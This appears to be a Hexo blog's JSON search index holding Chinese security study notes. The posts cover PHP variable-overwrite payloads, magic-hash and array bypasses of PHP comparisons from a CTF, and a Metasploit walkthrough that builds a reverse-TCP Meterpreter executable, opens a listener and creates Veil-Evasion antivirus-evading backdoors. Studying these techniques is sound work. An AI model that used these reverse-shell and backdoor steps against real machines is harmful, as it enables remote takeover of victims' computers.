[{"title":"php变量覆盖的学习","url":"http://yoursite.com/2017/03/14/php变量覆盖的学习/","content":"<h1 id=\"关于php变量覆盖漏洞：\"><a href=\"#关于php变量覆盖漏洞：\" class=\"headerlink\" title=\"关于php变量覆盖漏洞：\"></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p>\n<h2 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract():\"></a>extract():</h2><p>栗子:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php </div><div class=\"line\">$a = 2333;</div><div class=\"line\">@extract($_GET);</div><div class=\"line\">print_r($a);</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str():\"></a>parse_str():</h2><p>栗子:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">$a=2333;</div><div class=\"line\">parse_str($_SERVER[&apos;QUERY_STRING&apos;]);</div><div class=\"line\">print $var;</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"$$:\"></a>$$:</h2><p>栗子:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php </div><div class=\"line\">$a = 2333;</div><div class=\"line\">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request)&#123;</div><div class=\"line\">\tforeach($$_request as $_key=&gt;$_value)&#123;</div><div class=\"line\">\t\t$$_key = addslashes($_value);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">print_r($a)</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>payload:<br><code>?a=1//即可覆盖$a</code></p>\n","categories":[],"tags":["php"]},{"title":"关于php比较运算符","url":"http://yoursite.com/2017/02/28/关于php比较运算符/","content":"<h1 id=\"比较运算符”-”与”-”的学习：\"><a href=\"#比较运算符”-”与”-”的学习：\" class=\"headerlink\" title=\"比较运算符”==”与”===”的学习：\"></a>比较运算符”==”与”===”的学习：</h1><h2 id=\"关于”-”的绕过：\"><a href=\"#关于”-”的绕过：\" class=\"headerlink\" title=\"关于”==”的绕过：\"></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>eg:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code></p>\n<h2 id=\"关于“-”的绕过：\"><a href=\"#关于“-”的绕过：\" class=\"headerlink\" title=\"关于“===”的绕过：\"></a>关于“===”的绕过：</h2><p>利用数组绕过</p>\n<p>eg:一道简单的CTF题目：</p>\n<pre><code>if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) {\n    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])\n        print &apos;Your password can not be your name.&apos;;\n    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))\n        die(&apos;Flag: &apos;.$flag);\n</code></pre><p>payload:<br><code>?name[]=1&amp;password[]=2</code></p>\n","categories":[],"tags":["php"]},{"title":"msf 初体验","url":"http://yoursite.com/2017/02/06/msf初体验/","content":"<h1 id=\"msf简单使用：-以windows-meterpreter-reverse-tcp为例\"><a href=\"#msf简单使用：-以windows-meterpreter-reverse-tcp为例\" class=\"headerlink\" title=\"msf简单使用：(以windows/meterpreter/reverse_tcp为例)\"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id=\"1-payload设置：\"><a href=\"#1-payload设置：\" class=\"headerlink\" title=\"1.payload设置：\"></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>\n<h2 id=\"2-监听：\"><a href=\"#2-监听：\" class=\"headerlink\" title=\"2.监听：\"></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>\n<h2 id=\"3-插入攻击荷载\"><a href=\"#3-插入攻击荷载\" class=\"headerlink\" title=\"3.插入攻击荷载\"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>\n<h2 id=\"4-使用run-或者-exploit-启动攻击\"><a href=\"#4-使用run-或者-exploit-启动攻击\" class=\"headerlink\" title=\"4.使用run 或者 exploit 启动攻击\"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>\n<p>==============================</p>\n<h1 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS:\"></a>PS:</h1><h2 id=\"使用veil-veasion生成后门：\"><a href=\"#使用veil-veasion生成后门：\" class=\"headerlink\" title=\"使用veil-veasion生成后门：\"></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>\n<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>\n<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>\n","categories":[],"tags":["metasploit"]},{"title":"Hello World","url":"http://yoursite.com/2017/01/14/hello world/","content":"<p>寒假宅在家里无聊搭了这个博客,以后有空会在上面分享一些东西吧。</p>\n<p>随便写写说的好像有人会来看的样子。。。</p>\n","categories":[],"tags":[]},{"title":"about","url":"http://yoursite.com/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://yoursite.com/tag/index.html","content":"","categories":[],"tags":[]},{"title":"project","url":"http://yoursite.com/project/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]}]